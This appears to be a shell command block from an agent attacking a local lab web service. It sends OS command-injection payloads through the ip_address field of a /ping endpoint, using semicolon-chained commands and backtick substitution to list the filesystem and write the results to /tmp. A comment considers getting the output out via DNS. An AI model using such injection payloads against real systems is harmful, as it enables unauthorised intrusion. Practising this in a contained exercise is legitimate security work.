input.command:
# Check what's on the server
curl -s -X POST http://localhost:46349/ping --data-urlencode "ip_address=127.0.0.1; ls / > /tmp/out.txt" -o /dev/null
curl -s -X POST http://localhost:46349/ping --data-urlencode "ip_address=127.0.0.1; ls -la / > /tmp/lsroot.txt; pwd > /tmp/pwd.txt" -o /dev/null
# now try to see static files or via ping output
# Let's try using the output via DNS or reflected output
echo "TESTING DIRECT OUTPUT"
curl -s -X POST http://localhost:46349/ping --data-urlencode 'ip_address=127.0.0.1`ls`' | head -20
